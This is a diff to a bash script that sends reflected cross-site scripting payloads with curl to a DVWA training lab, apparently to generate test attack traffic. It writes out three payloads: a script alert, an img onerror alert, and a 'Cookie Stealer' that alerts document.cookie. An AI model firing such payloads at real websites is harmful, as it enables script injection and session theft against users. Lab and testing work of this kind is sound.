@@ -74,17 +74,17 @@ case $choice in
         echo -e "${YELLOW}[*] Starting Cross-Site Scripting attacks...${NC}"
         
         echo -e "${BLUE}[*] Attack 1: Basic Script Injection${NC}"
-        curl -s "$DVWA_URL/vulnerabilities/xss_reflected/?name=%3Cscript%3Ealert%28%27XSS%20Test%27%29%3C%2Fscript%3E" > /dev/null
+        curl -s -L "$DVWA_URL/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS%20Test%27%29%3C%2Fscript%3E" > /dev/null
         echo -e "${GREEN}[+] Payload sent: <script>alert('XSS Test')</script>${NC}"
         sleep $ATTACK_DELAY
         
         echo -e "${BLUE}[*] Attack 2: Event Handler Injection${NC}"
-        curl -s "$DVWA_URL/vulnerabilities/xss_reflected/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E" > /dev/null
+        curl -s -L "$DVWA_URL/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E" > /dev/null
         echo -e "${GREEN}[+] Payload sent: <img src=x onerror=alert('XSS')>${NC}"
         sleep $ATTACK_DELAY
         
         echo -e "${BLUE}[*] Attack 3: Cookie Stealer${NC}"
-        curl -s "$DVWA_URL/vulnerabilities/xss_reflected/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E" > /dev/null
+        curl -s -L "$DVWA_URL/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E" > /dev/null
         echo -e "${GREEN}[+] Payload sent: <script>alert(document.cookie)</script>${NC}"
         sleep $ATTACK_DELAY
         
